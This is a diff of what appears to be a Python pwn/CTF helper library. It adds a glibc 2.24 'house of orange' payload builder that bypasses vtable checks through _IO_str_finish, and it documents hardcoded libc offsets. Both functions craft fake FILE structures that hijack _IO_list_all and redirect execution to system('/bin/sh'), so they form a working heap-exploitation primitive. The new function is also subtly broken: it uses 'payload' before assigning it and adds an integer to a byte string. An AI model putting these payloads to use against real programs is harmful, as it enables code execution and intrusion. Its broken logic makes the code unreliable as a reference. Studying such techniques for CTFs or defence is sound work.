@@ -130,12 +130,38 @@ def house_of_orange(head_addr, system_addr, io_list_all):
 
 def VtableCheckBypass(vtable_addr, system_addr, binsh_addr, io_list_all_addr):
     """
+    _IO_str_overflow conditions
+
     houseoforange glibc.2.24 bypass vtablecheck
+
+    vtable_addr is _IO_str_overflow addr (libc 2.24: 0x3BE058)
     """
 	payload = p64(0) + p64(0x61) + p64(0) + p64(io_list_all_addr - 0x10)
 	payload += p64(0) + p64((binsh_addr - 100) / 2 + 1) + p64(0) + p64(0) + p64((binsh_addr - 100) / 2) + p64(0) * 6 + p64(0) + p64(0) * 4
 	payload += p64(0) + p64(2) + p64(3) + p64(0) + p64(0xffffffffffffffff) + p64(0) * 2 + p64(vtable_addr - 0x18) + p64(system_addr)
 	return payload
+
+def VtableCheckBypass_2(vtable_addr,heap_addr,system_addr,binsh_addr,io_list_all_addr):
+    """
+    _IO_str_finish conditions
+    
+    houseoforange glibc.2.24 bypass vtablecheck
+
+    vtable_addr is _IO_str_finish addr (libc 2.24: 0x3BE050)
+
+    """
+    payload += p64((binsh_addr+0x10) & ~1) + p64(0x61)
+    payload += p64(0) + p64(io_list_all_addr-0x10)
+    payload += p64(0) + p64(1)
+    payload += p64(0) + p64(binsh_addr)
+    payload += p64(0) * 12
+    payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
+    payload += p64(0) * 2
+    payload += p64(vtable_addr-0x18)
+    payload = payload.ljust(0xe8,'\x00') + p64(system_addr)
+    payload += p64(payload+0x660)
+
+    return payload
 
 def get_main_arena(libc_file):
     """
